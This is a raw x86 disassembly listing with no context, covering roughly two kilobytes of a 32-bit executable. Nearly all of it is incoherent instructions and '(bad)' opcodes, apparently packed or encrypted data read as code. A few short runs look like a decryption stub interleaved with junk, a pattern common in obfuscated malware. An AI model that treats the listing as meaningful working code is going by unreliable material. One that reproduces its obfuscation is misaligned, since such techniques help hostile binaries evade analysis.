  40b618:	shr    DWORD PTR [eax+0x67],cl
  40b61b:	out    0xc1,al
  40b61d:	xchg   edx,eax
  40b61e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40b620:	cmc    
  40b621:	mov    al,ds:0x7517c6f0
  40b626:	nop
  40b627:	ds jbe 0x40b5ef
  40b62a:	sub    ah,BYTE PTR [ebx]
  40b62c:	or     eax,0x4955b5c7
  40b631:	mov    bh,BYTE PTR [edx+0x3283ae5a]
  40b637:	mov    edx,0xc87e5eb4
  40b63c:	or     BYTE PTR [ecx+0x33],al
  40b63f:	xor    edx,esi
  40b641:	leave  
  40b642:	mov    ecx,0x5214a9a1
  40b647:	scas   eax,DWORD PTR es:[edi]
  40b648:	mov    WORD PTR [edi+0xbb23d70],ds
  40b64e:	lahf   
  40b64f:	add    BYTE PTR [edi+0x2b2d21b6],ah
  40b655:	loope  0x40b699
  40b657:	int    0x68
  40b659:	mov    ah,al
  40b65b:	xor    BYTE PTR ds:0xc5a9601c,0xe9
  40b662:	mov    WORD PTR [ebx-0x1c42ea03],fs
  40b668:	mov    WORD PTR [ecx],?
  40b66a:	out    dx,eax
  40b66b:	push   ss
  40b66c:	push   ss
  40b66d:	loop   0x40b6dd
  40b66f:	xor    DWORD PTR [edi+0x30],esi
  40b672:	aas    
  40b673:	mov    bl,0xe6
  40b675:	ror    BYTE PTR [esi+edx*1],0x1d
  40b679:	cmp    cl,BYTE PTR [esi+0x5c]
  40b67c:	rcr    edx,0x1
  40b67f:	mov    edi,0xc66498d4
  40b684:	(bad)  
  40b685:	js     0x40b6ec
  40b687:	add    BYTE PTR [eax-0x13e0d057],dl
  40b68d:	jmp    0x39e5a37d
  40b692:	pushf  
  40b693:	jns    0x40b658
  40b695:	adc    DWORD PTR [eax],0xffffffd1
  40b698:	out    dx,eax
  40b699:	jae    0x40b6c6
  40b69b:	mov    edi,0x899d4c51
  40b6a0:	addr16 mov ebp,0xaa65c0c6
  40b6a6:	shl    BYTE PTR [edx],1
  40b6a8:	fbstp  TBYTE PTR [ebx+0x2c]
  40b6ab:	sbb    eax,0xaa349f65
  40b6b0:	mov    eax,DWORD PTR [ebp-0x10]
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x77
  40b6da:	bound  ecx,QWORD PTR [ebx+0x7ef2d972]
  40b6e0:	jle    0x40b710
  40b6e2:	jge    0x40b762
  40b6e4:	jle    0x40b6bd
  40b6e6:	stos   DWORD PTR es:[edi],eax
  40b6e7:	sbb    eax,0x993d1b3c
  40b6ec:	push   0x661331d7
  40b6f1:	cld    
  40b6f2:	popa   
  40b6f3:	ds mov esi,0xb2ee3ded
  40b6f9:	xor    edi,DWORD PTR [eax+edi*8-0x48]
  40b6fd:	outs   dx,DWORD PTR ds:[esi]
  40b6fe:	adc    al,0x38
  40b700:	jl     0x40b6bc
  40b702:	mov    eax,0xbf82014c
  40b707:	popf   
  40b708:	mov    dh,0xf9
  40b70a:	mov    ch,0xa8
  40b70c:	adc    dh,ch
  40b70e:	jg     0x40b785
  40b710:	(bad)  
  40b711:	in     al,0xe0
  40b713:	xor    DWORD PTR [esi-0x43],0xd85fbf56
  40b71a:	sahf   
  40b71b:	loopne 0x40b72e
  40b71d:	ss push ss
  40b71f:	mov    eax,0x620c947e
  40b724:	shl    ecx,1
  40b726:	cmp    edx,edi
  40b728:	xor    DWORD PTR [ebx-0x8],0xffffffc4
  40b72c:	mov    ds:0xfdde7c75,eax
  40b731:	add    eax,0xf63323c8
  40b736:	inc    ebx
  40b737:	std    
  40b738:	rcr    DWORD PTR [esi-0x5224e851],cl
  40b73e:	aaa    
  40b73f:	sbb    esp,DWORD PTR ds:0x7cdacd31
  40b745:	dec    ecx
  40b746:	xchg   ecx,eax
  40b747:	shr    DWORD PTR [ebp+0x55],1
  40b74a:	out    dx,al
  40b74b:	push   esp
  40b74c:	int    0xba
  40b74e:	sub    ebp,DWORD PTR [edx+0x7c]
  40b751:	push   edi
  40b752:	bound  esp,QWORD PTR [edi-0x56]
  40b755:	xchg   ebx,eax
  40b756:	(bad)  
  40b757:	aas    
  40b758:	shr    dl,1
  40b75a:	pop    ds
  40b75b:	xchg   DWORD PTR [esi],esp
  40b75d:	jmp    0x75225589
  40b762:	cwde   
  40b763:	loop   0x40b782
  40b765:	mov    edi,0x93adb1ce
  40b76a:	loopne 0x40b6ec
  40b76c:	push   ebp
  40b76d:	jle    0x40b790
  40b76f:	or     esp,esp
  40b771:	inc    esp
  40b772:	(bad)  
  40b773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b774:	and    eax,0xc2b1927b
  40b779:	add    eax,0xdf85ba52
  40b77e:	sbb    al,0x2c
  40b780:	mov    al,ds:0x27ff4242
  40b785:	mov    esp,0xc1a1c97b
  40b78a:	fst    QWORD PTR [esi+0x611dd58]
  40b790:	add    eax,0x6f596eb3
  40b795:	sub    BYTE PTR [esi],al
  40b797:	pop    eax
  40b798:	out    0xfa,eax
  40b79a:	sbb    ebp,eax
  40b79c:	je     0x40b81b
  40b79e:	xchg   ecx,eax
  40b79f:	fisttp QWORD PTR [ecx+0x4ac6b4d9]
  40b7a5:	mov    ebx,0xfcea1a96
  40b7aa:	(bad)  
  40b7ac:	jns    0x40b732
  40b7ae:	loope  0x40b78c
  40b7b0:	xor    eax,0x450eada5
  40b7b5:	add    DWORD PTR [ecx-0x56],edi
  40b7b8:	addr16 mov esi,0xea2765a
  40b7be:	pop    esi
  40b7bf:	(bad)  
  40b7c1:	mov    BYTE PTR [ebx],ah
  40b7c3:	hlt    
  40b7c4:	repnz add DWORD PTR es:[edi],0x4571452e
  40b7cc:	adc    eax,0x2444c3bb
  40b7d1:	mov    eax,ds:0x13db5a54
  40b7d6:	or     ecx,0xffffffa3
  40b7d9:	dec    edx
  40b7da:	mov    ebp,0xc441f214
  40b7df:	(bad)  
  40b7e0:	in     eax,0x24
  40b7e2:	aam    0xa8
  40b7e4:	mov    bh,0x9d
  40b7e6:	push   es
  40b7e7:	push   es
  40b7e8:	and    ebp,ebx
  40b7ea:	retf   0x67e3
  40b7ed:	and    BYTE PTR [esp+ebp*4-0x4e],dl
  40b7f1:	scas   al,BYTE PTR es:[edi]
  40b7f2:	mov    DWORD PTR [ecx+0x4e3c5ef4],esp
  40b7f8:	adc    ch,cl
  40b7fa:	lds    eax,FWORD PTR ds:0xd4d8b8a1
  40b800:	mov    WORD PTR [eax],es
  40b802:	cmp    al,0xff
  40b804:	push   edi
  40b805:	dec    esi
  40b806:	xchg   ecx,eax
  40b807:	test   bl,cl
  40b809:	push   eax
  40b80a:	addr16 xor al,0x6a
  40b80d:	iret   
  40b80e:	dec    DWORD PTR [ecx-0x99d87f7]
  40b814:	hlt    
  40b815:	cmp    edi,DWORD PTR [ecx-0x13973752]
  40b81b:	push   esi
  40b81c:	ja     0x40b843
  40b81e:	pop    es
  40b81f:	sti    
  40b820:	(bad)  
  40b821:	mov    ds:0x936e5d3f,eax
  40b826:	ret    
  40b827:	call   0x41f6:0x631050ba
  40b82e:	sbb    BYTE PTR [edx-0x7d2801bd],dl
  40b834:	call   0x64dc3c4f
  40b839:	adc    BYTE PTR ds:0x1c99cbdf,dh
  40b83f:	ret    0x2d42
  40b842:	inc    esp
  40b843:	mov    cl,0xf2
  40b845:	mov    esp,cs
  40b847:	pusha  
  40b848:	scas   eax,DWORD PTR es:[edi]
  40b849:	stos   DWORD PTR es:[edi],eax
  40b84a:	or     al,0x70
  40b84c:	push   cs
  40b84d:	test   BYTE PTR [ebx-0x41fbc0e6],dh
  40b853:	punpckhbw mm5,QWORD PTR [esi-0x37914cfe]
  40b85a:	jmp    0xcf117ca4
  40b85f:	imul   esi,DWORD PTR [eax+ecx*1-0x5e],0xffffffca
  40b864:	bound  ecx,QWORD PTR [ebx]
  40b866:	sbb    BYTE PTR [ebx+0x63],cl
  40b869:	ds jne 0x40b8b2
  40b86c:	nop
  40b86d:	add    eax,0x8a09d9f6
  40b872:	cwde   
  40b873:	adc    dh,dl
  40b875:	xchg   cl,bl
  40b877:	add    cl,BYTE PTR [ebx+0x5451d527]
  40b87d:	adc    edx,DWORD PTR [eax+0x79fcc58b]
  40b883:	ucomiss xmm2,xmm0
  40b886:	out    0xb5,al
  40b888:	or     al,0xf1
  40b88a:	fdiv   QWORD PTR [ebx-0x59]
  40b88d:	sub    eax,DWORD PTR ds:0xdb622c4f
  40b893:	ins    DWORD PTR es:[edi],dx
  40b894:	jb     0x40b8ca
  40b896:	(bad)  [edi+0x44]
  40b899:	imul   eax,edx,0x1f
  40b89c:	call   0xb5133c4d
  40b8a1:	rcr    BYTE PTR [ebp-0x47],1
  40b8a4:	sub    DWORD PTR [edx-0x7e],0xb90a5e41
  40b8ab:	es mov dl,0x21
  40b8ae:	add    ecx,ecx
  40b8b0:	test   al,0x5e
  40b8b2:	dec    esi
  40b8b3:	fwait
  40b8b4:	or     eax,DWORD PTR [edx]
  40b8b6:	mov    eax,0x4968600a
  40b8bb:	jmp    DWORD PTR [esi]
  40b8bd:	loope  0x40b87e
  40b8bf:	and    BYTE PTR [edx],dl
  40b8c1:	jo     0x40b860
  40b8c3:	scas   eax,DWORD PTR es:[edi]
  40b8c4:	pop    esi
  40b8c5:	scas   al,BYTE PTR es:[edi]
  40b8c6:	add    BYTE PTR [esi],dh
  40b8c8:	sbb    esi,edi
  40b8ca:	jbe    0x40b85b
  40b8cc:	loopne 0x40b8ff
  40b8ce:	retf   0x83e5
  40b8d1:	out    dx,eax
  40b8d2:	xor    DWORD PTR [edx-0x6c07b4ad],esp
  40b8d8:	inc    ebp
  40b8d9:	or     al,BYTE PTR [eax+0x35]
  40b8dc:	inc    edx
  40b8dd:	test   eax,0x174afcfc
  40b8e2:	mov    al,0x22
  40b8e4:	ffreep st(6)
  40b8e6:	(bad)
  40b8ea:	aas    
  40b8eb:	stos   DWORD PTR es:[edi],eax
  40b8ec:	pop    edx
  40b8ed:	ja     0x40b875
  40b8ef:	sbb    DWORD PTR [esi],ebp
  40b8f1:	xchg   ebp,eax
  40b8f2:	dec    ebx
  40b8f3:	xor    al,0x7d
  40b8f5:	mov    cl,0x7
  40b8f7:	cmp    cl,bl
  40b8f9:	cmc    
  40b8fa:	push   ss
  40b8fb:	aas    
  40b8fc:	pop    ebp
  40b8fd:	or     edi,DWORD PTR [edi-0x4a8e26c9]
  40b903:	add    al,0xcb
  40b905:	loop   0x40b88a
  40b907:	push   eax
  40b908:	adc    BYTE PTR [ecx-0x74],0xba
  40b90c:	add    edi,DWORD PTR [esi]
  40b90e:	dec    eax
  40b90f:	retf   
  40b910:	sbb    BYTE PTR [ecx+ebp*1+0x50],0x5b
  40b915:	bnd js 0x40b8ae
  40b918:	outs   dx,DWORD PTR ds:[esi]
  40b919:	and    eax,0xade5dfe1
  40b91e:	cmp    BYTE PTR [edi-0x47],ch
  40b921:	add    BYTE PTR [esi],bh
  40b923:	into   
  40b924:	out    dx,al
  40b925:	pop    ebx
  40b926:	and    al,0xa7
  40b928:	and    al,0x7b
  40b92a:	jae    0x40b986
  40b92c:	mov    ds:0x214c7c81,al
  40b931:	dec    ecx
  40b932:	pop    ebx
  40b933:	adc    DWORD PTR [eax+0x198d030c],eax
  40b939:	mov    eax,ds:0x4416f1ad
  40b93e:	imul   esp,DWORD PTR [ebp+edx*8+0x61],0x25fff722
  40b946:	sti    
  40b947:	(bad)  
  40b948:	push   eax
  40b949:	ds mov bh,0x69
  40b94c:	inc    edi
  40b94d:	add    DWORD PTR [ecx],ebx
  40b94f:	mov    edx,0xc1ac4a9d
  40b954:	inc    esi
  40b955:	(bad)  
  40b956:	xchg   ecx,eax
  40b957:	push   edx
  40b958:	jmp    0x40b989
  40b95a:	popf   
  40b95b:	jb     0x40b94e
  40b95d:	xchg   edx,eax
  40b95e:	push   ebx
  40b95f:	icebp  
  40b960:	pop    es
  40b961:	hlt    
  40b962:	cmp    eax,0x86113835
  40b967:	cdq    
  40b968:	mov    dh,0x99
  40b96a:	test   al,cl
  40b96c:	in     al,0x5c
  40b96e:	stos   BYTE PTR es:[edi],al
  40b96f:	mov    edi,0xb6124750
  40b974:	jge    0x40b9c1
  40b976:	sub    ah,BYTE PTR [ebx-0x3351511c]
  40b97c:	jne    0x40b9be
  40b97e:	or     bh,BYTE PTR [esi+edx*8-0x5c]
  40b982:	inc    ebp
  40b983:	ds ret 0x6185
  40b987:	add    edx,DWORD PTR [ebx-0xe244551]
  40b98d:	test   esi,ebx
  40b98f:	sub    al,0xcd
  40b991:	xor    DWORD PTR [ebx-0x5],edx
  40b994:	test   BYTE PTR [edx-0x1],bl
  40b997:	test   DWORD PTR [edi],0x80784480
  40b99d:	push   0x4578660b
  40b9a2:	in     al,0x22
  40b9a4:	stos   BYTE PTR es:[edi],al
  40b9a5:	scas   al,BYTE PTR es:[edi]
  40b9a6:	mov    fs,WORD PTR fs:[esi-0x198edc00]
  40b9ad:	sti    
  40b9ae:	xchg   esi,eax
  40b9af:	ret    0xd59d
  40b9b2:	fldcw  WORD PTR [eax-0x7f]
  40b9b5:	cmp    al,0x75
  40b9b7:	adc    eax,esi
  40b9b9:	adc    ecx,DWORD PTR [eax]
  40b9bb:	xchg   ecx,eax
  40b9bc:	jo     0x40b9bd
  40b9be:	sbb    BYTE PTR [ebx-0x17],cl
  40b9c1:	cmovno edx,DWORD PTR [edx+0x27]
  40b9c5:	pop    es
  40b9c6:	inc    edx
  40b9c7:	out    dx,al
  40b9c8:	loop   0x40b98c
  40b9ca:	push   cs
  40b9cb:	push   ebx
  40b9cc:	jg     0x40b95b
  40b9ce:	jae    0x40b96a
  40b9d0:	daa    
  40b9d1:	mov    edi,?
  40b9d3:	lahf   
  40b9d4:	bound  esp,QWORD PTR [edx+0x17815486]
  40b9da:	hlt    
  40b9db:	(bad)
  40b9de:	bound  esi,QWORD PTR [esi+0x4ebb699d]
  40b9e4:	clc    
  40b9e5:	pop    edx
  40b9e6:	int    0xee
  40b9e8:	dec    ecx
  40b9e9:	add    ecx,DWORD PTR [eax]
  40b9eb:	pop    edx
  40b9ec:	ret    
  40b9ed:	call   0xa81f:0x66409a6f
  40b9f4:	mov    ch,0x33
  40b9f6:	clc    
  40b9f7:	cwde   
  40b9f8:	and    al,0xf2
  40b9fa:	pop    ss
  40b9fb:	dec    edx
  40b9fc:	mov    ss,WORD PTR [ecx+0x613a103d]
  40ba02:	xor    ebx,DWORD PTR ds:0x9e2b47ba
  40ba08:	popf   
  40ba09:	enter  0x5aec,0xb9
  40ba0d:	inc    ebp
  40ba0e:	adc    eax,0xd4b067b2
  40ba13:	inc    esi
  40ba14:	mov    ah,0x66
  40ba16:	mov    ecx,DWORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	mov    WORD PTR [eax-0xe76c060],gs
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba55
  40ba42:	dec    esp
  40ba43:	ror    BYTE PTR [eax-0x61ff3b0c],cl
  40ba49:	xor    bl,cl
  40ba4b:	mov    edx,0x17c0d096
  40ba50:	and    DWORD PTR [edi+esi*4],esi
  40ba53:	mov    ecx,0xc150e9bc
  40ba58:	popa   
  40ba59:	repz push es
  40ba5b:	inc    ebx
  40ba5c:	mov    ds:0x8428db40,al
  40ba61:	sbb    eax,0x41eac628
  40ba66:	inc    esp
  40ba67:	or     BYTE PTR ds:0xd7d2f9c,ah
  40ba6d:	out    dx,eax
  40ba6e:	setne  dl
  40ba71:	rcr    DWORD PTR [ebx],1
  40ba73:	repnz and dl,bl
  40ba76:	adc    DWORD PTR es:[esi],0x3d3c4522
  40ba7d:	mov    ds:0xc48000e8,eax
  40ba82:	cmp    al,0xbe
  40ba84:	pop    ecx
  40ba85:	or     DWORD PTR [ebx-0x6e2eb60b],eax
  40ba8b:	jns    0x40bac6
  40ba8d:	push   esp
  40ba8e:	mov    DWORD PTR [ecx+0x646a11aa],esp
  40ba94:	clc    
  40ba95:	cmp    DWORD PTR [ecx+0x35],edi
  40ba98:	(bad)  
  40ba9a:	repz push ecx
  40ba9c:	fistp  WORD PTR [esi+0x6016a26e]
  40baa2:	mov    bl,0xc9
  40baa4:	ss sub bl,dl
  40baa7:	inc    esp
  40baa8:	sbb    esp,edi
  40baaa:	int3   
  40baab:	into   
  40baac:	mov    ch,0x69
  40baae:	clc    
  40baaf:	fsubr  st,st(1)
  40bab1:	dec    esp
  40bab2:	add    DWORD PTR ds:0x4534f169,ebx
  40bab8:	(bad)  
  40baba:	fsub   QWORD PTR [ebp-0x7]
  40babd:	sbb    BYTE PTR [edi],0x5f
  40bac0:	xor    BYTE PTR [ebp+0x6793fa1c],al
  40bac6:	pop    ebx
  40bac7:	int    0xd4
  40bac9:	inc    ecx
  40baca:	sahf   
  40bacb:	sahf   
  40bacc:	cmp    al,0x23
  40bace:	loope  0x40baa3
  40bad0:	stos   DWORD PTR es:[edi],eax
  40bad1:	sti    
  40bad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad3:	add    al,0x39
  40bad5:	mov    esi,DWORD PTR [ebx-0x6185567b]
  40badb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40badc:	xor    al,BYTE PTR [eax]
  40bade:	pop    ds
  40badf:	jno    0x40bb0d
  40bae1:	fwait
  40bae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bae3:	add    esi,ebx
  40bae5:	imul   ebx,esi,0x1734f90f
  40baeb:	cmc    
  40baec:	hlt    
  40baed:	not    ch
  40baef:	mov    ebp,0x8744e8e
  40baf4:	dec    edi
  40baf5:	mov    ebp,0x4d317e19
  40bafa:	fwait
  40bafb:	adc    bl,BYTE PTR [edi+0x27b7eb1c]
  40bb01:	and    dl,BYTE PTR [esp+eax*4-0x318c5871]
  40bb08:	cmp    eax,DWORD PTR ds:0x310f4a36
  40bb0e:	jns    0x40baf2
  40bb10:	mov    edx,0x82f6410e
  40bb15:	dec    ebx
  40bb16:	and    eax,0xf1a1400f
  40bb1b:	jns    0x40bb86
  40bb1d:	push   esp
  40bb1e:	sbb    esp,ecx
  40bb20:	es out 0xb9,eax
  40bb23:	in     al,0x92
  40bb25:	add    eax,0x949399d8
  40bb2a:	fs xchg ebx,eax
  40bb2c:	daa    
  40bb2d:	pop    eax
  40bb2e:	mov    ah,ah
  40bb30:	sub    DWORD PTR [esi],esp
  40bb32:	adc    eax,0x351f4b39
  40bb37:	adc    dh,BYTE PTR [eax+0x16]
  40bb3a:	mov    edx,0x61420241
  40bb3f:	mov    ?,WORD PTR [ebp-0x20]
  40bb42:	ret    
  40bb43:	lods   al,BYTE PTR ds:[esi]
  40bb44:	push   0xc21409cd
  40bb49:	fdiv   st,st(6)
  40bb4b:	fiadd  WORD PTR [edi]
  40bb4d:	xlat   BYTE PTR ds:[ebx]
  40bb4e:	mov    dl,0xef
  40bb50:	cli    
  40bb51:	repnz inc ecx
  40bb53:	xchg   DWORD PTR [eax],edx
  40bb55:	das    
  40bb56:	out    0x4b,al
  40bb58:	mov    eax,0xb5e810b8
  40bb5d:	mov    ds:0xe4a16175,eax
  40bb62:	pop    edi
  40bb63:	xor    al,0xa3
  40bb65:	dec    DWORD PTR [edx+esi*1+0x7fce407b]
  40bb6c:	sub    eax,0xd99e5a23
  40bb71:	push   0xffffff9f
  40bb73:	mov    ebp,0x1941853
  40bb78:	add    BYTE PTR [ebx-0x52],0x9d
  40bb7c:	jo     0x40bb69
  40bb7e:	add    cl,bl
  40bb80:	call   0xe0a2:0x85985a09
  40bb87:	outs   dx,DWORD PTR ds:[esi]
  40bb88:	cmp    DWORD PTR [ebx+0x34],0xffffff9e
  40bb8c:	add    eax,0xd99729f3
  40bb91:	rcl    BYTE PTR [eax+0x13207b3b],0xf4
  40bb98:	popa   
  40bb99:	ret    
  40bb9a:	call   0x875fb002
  40bb9f:	out    dx,al
  40bba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bba2:	fst    st(7)
  40bba4:	sbb    eax,0x210f21c6
  40bba9:	pop    eax
  40bbaa:	adc    eax,0xd569e187
  40bbaf:	(bad)  
  40bbb0:	or     eax,0x77d9843c
  40bbb5:	mov    BYTE PTR [esi],ch
  40bbb7:	dec    eax
  40bbb8:	neg    esp
  40bbba:	pushf  
  40bbbb:	jb     0x40bb5b
  40bbbd:	adc    eax,edi
  40bbbf:	push   ss
  40bbc0:	or     BYTE PTR [edi+0x57cfa5f5],dl
  40bbc6:	gs pushf 
  40bbc8:	lods   al,BYTE PTR ds:[esi]
  40bbc9:	loope  0x40bba0
  40bbcb:	mov    dl,0xe3
  40bbcd:	xor    DWORD PTR [ebx+ebp*1],0xc275480e
  40bbd4:	(bad)  
  40bbd5:	and    al,0x99
  40bbd7:	lahf   
  40bbd8:	in     eax,dx
  40bbd9:	test   BYTE PTR [esi],bl
  40bbdb:	jo     0x40bc5a
  40bbdd:	pop    eax
  40bbde:	dec    esi
  40bbdf:	call   0xac64:0xcfffbba8
  40bbe6:	lds    edi,FWORD PTR [esi*1-0x128ce204]
  40bbed:	sub    ebx,DWORD PTR [edi+0x7488d487]
  40bbf3:	push   edx
  40bbf4:	fs add al,0xa8
  40bbf7:	dec    edx
  40bbf8:	sbb    al,0xe8
  40bbfa:	jb     0x40bbe1
  40bbfc:	rol    DWORD PTR [esi+ecx*8-0x13],cl
  40bc00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc01:	bound  ecx,QWORD PTR [edi+eax*8]
  40bc04:	mov    edi,0x57328d58
  40bc09:	mov    ch,0xc2
  40bc0b:	je     0x40bc09
  40bc0d:	scas   al,BYTE PTR es:[edi]
  40bc0e:	shr    BYTE PTR [esi+0x75],cl
  40bc11:	(bad)  
  40bc13:	or     DWORD PTR [ebx+0x3fdb7ea4],ebx
  40bc19:	call   0x56196603
  40bc1e:	aaa    
  40bc1f:	in     eax,dx
  40bc20:	adc    DWORD PTR [esi-0x7179849d],esi
  40bc26:	mov    dl,0x49
  40bc28:	mov    ecx,0x65bedc8d
  40bc2d:	mov    BYTE PTR [ebx-0x57],dh
  40bc30:	lahf   
  40bc31:	in     al,dx
  40bc32:	(bad)  
  40bc34:	dec    edi
  40bc35:	and    bl,BYTE PTR [esi+0x78]
  40bc38:	dec    edi
  40bc39:	mov    edi,0x9ee88d37
  40bc3e:	jl     0x40bc9d
  40bc40:	push   esi
  40bc41:	jbe    0x40bcae
  40bc43:	xchg   ebp,eax
  40bc44:	aad    0xa2
  40bc46:	enter  0xe9e5,0xd6
  40bc4a:	in     eax,0x5a
  40bc4c:	fisttp DWORD PTR [ecx]
  40bc4e:	imul   esi,DWORD PTR [ecx-0x7ca65904],0xa746988f
  40bc58:	(bad)  
  40bc59:	int3   
  40bc5a:	cwde   
  40bc5b:	outs   dx,DWORD PTR ds:[esi]
  40bc5c:	mov    esi,0x3062d15e
  40bc61:	mov    cl,0x51
  40bc63:	xchg   esi,eax
  40bc64:	push   ebx
  40bc65:	sub    DWORD PTR [ecx+0x6e],eax
  40bc68:	stos   BYTE PTR es:[edi],al
  40bc69:	sbb    cl,dh
  40bc6b:	push   0x6946580b
  40bc70:	pop    ecx
  40bc71:	inc    edi
  40bc72:	and    DWORD PTR [esi+ebp*4],0xf6a56379
  40bc79:	or     bl,ah
  40bc7b:	in     eax,0x68
  40bc7d:	push   eax
  40bc7e:	mov    ecx,0x7ffb1dd6
  40bc83:	push   cs
  40bc84:	mov    ebp,0xa2e6b67
  40bc89:	out    0x27,eax
  40bc8b:	add    edx,DWORD PTR [ecx]
  40bc8d:	ss cmc 
  40bc8f:	and    al,0x5c
  40bc91:	loop   0x40bc9e
  40bc93:	jno    0x40bc69
  40bc95:	fild   QWORD PTR [eax]
  40bc97:	arpl   WORD PTR [esp+eiz*8],bx
  40bc9a:	cwde   
  40bc9b:	stc    
  40bc9c:	mov    BYTE PTR [edx-0x44],bl
  40bc9f:	xor    dl,cl
  40bca1:	mov    al,ds:0x4394fc50
  40bca6:	xor    BYTE PTR ds:0xa601d010,dl
  40bcac:	stc    
  40bcad:	test   al,0x84
  40bcaf:	retf   
  40bcb0:	or     esp,ebx
  40bcb2:	push   ds
  40bcb3:	adc    ah,BYTE PTR [edi]
  40bcb5:	test   DWORD PTR [ebp-0x31],ebx
  40bcb8:	jno    0x40bc40
  40bcba:	(bad)  [eax-0x40]
  40bcbd:	enter  0x2195,0x45
  40bcc1:	xlat   BYTE PTR ds:[ebx]
  40bcc2:	sub    eax,0x1b9efc05
  40bcc7:	push   edi
  40bcc8:	jmp    0x40bc8b
  40bcca:	cmp    al,0x2b
  40bccc:	dec    edx
  40bccd:	mov    al,ah
  40bccf:	lods   eax,DWORD PTR ds:[esi]
  40bcd0:	mov    BYTE PTR [eax-0x135a13d4],dl
  40bcd6:	push   edi
  40bcd7:	mov    eax,0x2b8c84ec
  40bcdc:	ret    0xd466
  40bcdf:	or     ebp,DWORD PTR ds:0xcdde85c2
  40bce5:	pop    ds
  40bce6:	and    BYTE PTR [edi-0x72],bl
  40bce9:	les    esi,FWORD PTR [edi+ebx*4-0x1daacb5]
  40bcf0:	push   edi
  40bcf1:	pop    ss
  40bcf2:	ficomp DWORD PTR [ebp+0x6e41552f]
  40bcf8:	pop    ss
  40bcf9:	jne    0x40bcb0
  40bcfb:	sti    
  40bcfc:	pop    ecx
  40bcfd:	or     eax,0x38a32a8a
  40bd02:	dec    ebp
  40bd03:	lods   al,BYTE PTR ds:[esi]
  40bd04:	xchg   ebx,eax
  40bd05:	test   DWORD PTR [ebx],ebp
  40bd07:	ret    0x314b
  40bd0a:	cmp    al,0x34
  40bd0c:	pop    ecx
  40bd0d:	clc    
  40bd0e:	repz mov bp,0x4d81
  40bd13:	lods   al,BYTE PTR ds:[esi]
  40bd14:	cli    
  40bd15:	pop    ss
  40bd16:	or     DWORD PTR [eax+0x304261a8],ecx
  40bd1c:	add    esp,0xffffffde
  40bd1f:	call   0x1ac5:0x658f28df
  40bd26:	jno    0x40bce3
  40bd28:	stc    
  40bd29:	arpl   WORD PTR [edx],ax
  40bd2b:	push   0x12
  40bd2d:	repz je 0x40bd90
  40bd30:	mov    esi,0x39389ca0
  40bd35:	stos   DWORD PTR es:[edi],eax
  40bd36:	xor    bh,ah
  40bd38:	out    0xa6,eax
  40bd3a:	(bad)  
  40bd3c:	inc    edi
  40bd3d:	(bad)  
  40bd3e:	xor    edi,DWORD PTR [eax-0xa]
  40bd41:	int    0x53
  40bd43:	out    dx,eax
  40bd44:	out    dx,eax
  40bd45:	pop    ecx
  40bd46:	push   0x79
  40bd48:	dec    edi
  40bd49:	pushf  
  40bd4a:	sub    eax,0x89bbd81f
  40bd4f:	aas    
  40bd50:	fstp   DWORD PTR [ecx-0x3e8f6b23]
  40bd56:	and    ecx,DWORD PTR [ebx+0x3b2376d3]
  40bd5c:	cli    
  40bd5d:	fcmovb st,st(0)
  40bd5f:	add    al,0x2a
  40bd61:	enter  0xd060,0x81
  40bd65:	mov    dh,0xf9
  40bd67:	shl    ah,0x83
  40bd6a:	popf   
  40bd6b:	push   ds
  40bd6c:	fldenv [edi-0x7436846e]
  40bd72:	dec    ebp
  40bd73:	or     al,0x33
  40bd75:	mov    BYTE PTR [ebx],0xc0
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz popa 
  40bd8c:	in     al,dx
  40bd8d:	cmc    
  40bd8e:	mov    cl,0xb9
  40bd90:	cld    
  40bd91:	jle    0x40be11
  40bd93:	cs jge 0x40be14
  40bd96:	jle    0x40bdb0
  40bd98:	shr    cl,cl
  40bd9a:	sub    al,BYTE PTR [edx+0x4871d5d3]
  40bda0:	ins    DWORD PTR es:[edi],dx
  40bda1:	outs   dx,DWORD PTR ds:[esi]
  40bda2:	xchg   BYTE PTR [ebx+eax*8+0x45c3e6ed],ch
  40bda9:	lods   al,BYTE PTR ds:[esi]
  40bdaa:	mov    ebx,0xb63917b7
  40bdaf:	xchg   esp,eax
  40bdb0:	mov    WORD PTR [edx],?
  40bdb2:	enter  0xcd51,0x45
  40bdb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb7:	es ret 0x73c1
  40bdbb:	ret    
  40bdbc:	pop    eax
  40bdbd:	sahf   
  40bdbe:	nop
  40bdbf:	fistp  DWORD PTR [ebx]
  40bdc1:	fwait
  40bdc2:	in     al,0xa6
  40bdc4:	and    cl,BYTE PTR [edx+0xa]
  40bdc7:	add    bh,BYTE PTR ds:0xc2d58dde
